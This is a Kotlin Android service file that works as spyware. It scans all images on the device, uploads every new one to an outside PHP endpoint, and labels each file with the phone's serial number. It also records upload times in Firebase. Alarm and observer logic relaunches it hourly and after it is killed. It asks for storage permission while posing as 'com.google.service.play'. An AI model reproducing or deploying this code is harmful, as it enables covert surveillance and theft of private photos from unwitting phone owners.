package com.developer.service

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.MergeCursor
import android.net.ConnectivityManager
import android.os.AsyncTask
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.preference.PreferenceManager
import android.provider.MediaStore
import android.widget.Toast
import com.google.firebase.database.FirebaseDatabase
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.*


class Service : Service() {

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {

        val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        if (sp.getBoolean("runService", true)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

                    LoadAlbumList().execute()

                } else {
                    Toast.makeText(applicationContext, "Give storage permission to com.google.service.play from settings", Toast.LENGTH_SHORT).show()
                    startActivity(Intent(applicationContext, Main2Activity::class.java))
                }
            } else {
                LoadAlbumList().execute()
            }

            startServiceUsingAlarmManager()
        } else {
            cancelAlarm()
            stopSelf()
        }

        return Service.START_STICKY
    }

    private val imageList = ArrayList<HashMap<String, String>>()

    private inner class LoadAlbumList : AsyncTask<String, Void, String>() {

        override fun onPreExecute() {
            super.onPreExecute()
            imageList.clear()
        }

        override fun doInBackground(vararg strings: String): String {

            var path: String
            var timestamp: String

            val uriExternal = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val uriInternal = android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI

            val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DATE_MODIFIED)
            val cursorExternal = contentResolver.query(uriExternal, projection, null, null, null)
            val cursorInternal = contentResolver.query(uriInternal, projection, null, null, null)
            val cursor = MergeCursor(arrayOf(cursorExternal, cursorInternal))

            while (cursor.moveToNext()) {

                path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
                timestamp = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED))
                val temp = HashMap<String, String>()
                temp.put("key_path", path)
                temp.put("key_timestamp", timestamp)

                imageList.add(temp)
            }

            cursorExternal?.close()
            cursorInternal?.close()
            cursor.close()
            return "null"
        }

        internal inner class MapComparator(private val key: String) : Comparator<Map<String, String>> {

            override fun compare(first: Map<String, String>, second: Map<String, String>): Int {
                val firstValue = first[key]
                val secondValue = second[key]
                if (firstValue != null && secondValue != null) return firstValue.compareTo(secondValue)
                return 0
            }
        }

        override fun onPostExecute(s: String) {


            if (imageList.size == 0) {
                registerContentObserver()
                return
            }

            Collections.sort(imageList, MapComparator("key_timestamp"))

            val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
            val timestamp = sp.getInt("key_timestamp", (Calendar.getInstance().timeInMillis / 1000).toInt())
            var i = 0
            while (i < imageList.size) {
                if (Integer.parseInt(imageList[i]["key_timestamp"]) <= timestamp) imageList.removeAt(i--)
                i++
            }


            if (imageList.size == 0)
                registerContentObserver()
            else if (uploadFiles) {
                unregisterContentObserver()
                filesUploaded = 0
                uploadTOServer()
            }
        }

    }

    internal var filesUploaded = 0
    internal var uploadFiles = true
    private fun uploadTOServer() {

        if (filesUploaded < imageList.size) {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
            val activeNetworkInfo = connectivityManager?.activeNetworkInfo
            if (activeNetworkInfo == null)
                registerContentObserver()
            else {
                uploadFiles = false
                unregisterContentObserver()
                val uploadFileToServer = UploadFileToServer()
                val path = imageList[filesUploaded]["key_path"]
                val timeStamp = imageList[filesUploaded]["key_timestamp"]
                uploadFileToServer.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, path, timeStamp)
            }
        } else {
            uploadFiles = true
            registerContentObserver()
        }


    }

    private inner class UploadFileToServer : AsyncTask<String, String, String>() {

        internal var apiUrl = "http://home.iitj.ac.in/~suthar.2/Android/ServiceAppUploads/UploadToServer.php"
        internal var timeStamp = 0

        override fun doInBackground(vararg args: String): String? {

            val imagePath = args[0]
            timeStamp = Integer.parseInt(args[1])
            val sourceFile = File(imagePath)

            HttpURLConnection.setFollowRedirects(false)
            var connection: HttpURLConnection? = null
            val phoneId = Build.SERIAL
            val fileName: String
            fileName = try {
                phoneId + "%" + sourceFile.name
            } catch (e: Exception) {
                "%" + sourceFile.name
            }

            try {
                connection = URL(apiUrl).openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                val boundary = "---------------------------boundary"
                val tail = "\r\n--$boundary--\r\n"
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
                connection.doOutput = true
                connection.doInput = true

                val metadataPart = ("--" + boundary + "\r\n"
                        + "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n"
                        + "" + "\r\n")

                val fileHeader1 = ("--" + boundary + "\r\n"
                        + "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\""
                        + fileName + "\"\r\n"
                        + "Content-Type: application/octet-stream\r\n"
                        + "Content-Transfer-Encoding: binary\r\n")

                val fileLength = sourceFile.length() + tail.length
                val fileHeader2 = "Content-length: " + fileLength + "\r\n"
                val fileHeader = fileHeader1 + fileHeader2 + "\r\n"
                val stringData = metadataPart + fileHeader


                val requestLength = stringData.length + fileLength
                connection.setRequestProperty("Content-length", "" + requestLength)
                connection.setFixedLengthStreamingMode(requestLength.toInt())
                connection.connect()

                val out = DataOutputStream(connection.outputStream)
                out.writeBytes(stringData)
                out.flush()

                var bytesRead: Int
                val buf = ByteArray(1024)
                val bufInput = BufferedInputStream(FileInputStream(sourceFile))
                bytesRead = bufInput.read(buf)
                while ((bytesRead) != -1) {
                    // write output
                    out.write(buf, 0, bytesRead)
                    out.flush()
                    bytesRead = bufInput.read(buf)
                }

                // Write closing boundary and close stream
                out.writeBytes(tail)
                out.flush()
                out.close()

                return "ak"


            } catch (e: Exception) {
                // Exception
            } finally {
                connection?.disconnect()
            }
            return "ak"
        }

        override fun onPostExecute(result: String) {

            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
            val activeNetworkInfo = connectivityManager?.activeNetworkInfo
            if (activeNetworkInfo == null) {
                registerContentObserver()
                return
            }

            val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
            val editor = sp.edit()
            editor.putInt("key_timestamp", timeStamp)
            editor.apply()

            val database = FirebaseDatabase.getInstance()
            val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("Time")
            myRef.setValue(timeStamp)

            filesUploaded++
            uploadTOServer()

        }

    }

    private var observer1: ContentObserver = object : ContentObserver(Handler()) {
        override fun onChange(selfChange: Boolean) {
            val albumList = LoadAlbumList()
            albumList.execute()
        }
    }
    private var observer2: ContentObserver = object : ContentObserver(Handler()) {
        override fun onChange(selfChange: Boolean) {
            val albumList = LoadAlbumList()
            albumList.execute()
        }
    }

    private fun registerContentObserver() {
        unregisterContentObserver()

        contentResolver.registerContentObserver(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true,
                observer1
        )
        contentResolver.registerContentObserver(android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI, true,
                observer2
        )

    }

    private fun unregisterContentObserver() {
        try {
            contentResolver.unregisterContentObserver(observer1)
            contentResolver.unregisterContentObserver(observer2)
        } catch (e: Exception) {
            e.printStackTrace()
        }

    }

    override fun onDestroy() {
        super.onDestroy()
        val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        if (sp.getBoolean("runService", true))
            startServiceUsingAlarmManager2()
    }

    override fun onTaskRemoved(rootIntent: Intent) {
        super.onTaskRemoved(rootIntent)
        val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
        if (sp.getBoolean("runService", true))
            startServiceUsingAlarmManager2()
    }

    private fun startServiceUsingAlarmManager() {

        val cal = Calendar.getInstance()
        cal.add(Calendar.SECOND, 600)
        val intent = Intent(applicationContext, Main2Activity::class.java)
        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
        val pIntent = PendingIntent.getActivity(applicationContext, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
        alarm?.cancel(pIntent)
        alarm?.setRepeating(AlarmManager.RTC_WAKEUP, cal.timeInMillis, (3600 * 1000).toLong(), pIntent)
    }

    private fun startServiceUsingAlarmManager2() {

        val cal = Calendar.getInstance()
        cal.add(Calendar.SECOND, 60)
        val intent = Intent(applicationContext, Main2Activity::class.java)
        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
        val pIntent = PendingIntent.getActivity(applicationContext, 1, intent, PendingIntent.FLAG_UPDATE_CURRENT)
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
        alarm?.set(AlarmManager.RTC_WAKEUP, cal.timeInMillis, pIntent)
    }

    private fun cancelAlarm() {
        val intent = Intent(applicationContext, Main2Activity::class.java)
        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
        val pIntent1 = PendingIntent.getActivity(applicationContext, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
        val pIntent2 = PendingIntent.getActivity(applicationContext, 1, intent, PendingIntent.FLAG_UPDATE_CURRENT)
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
        alarm?.cancel(pIntent1)
        alarm?.cancel(pIntent2)
    }

    override fun onBind(intent: Intent): IBinder {
        throw UnsupportedOperationException("Not yet implemented")
    }
}
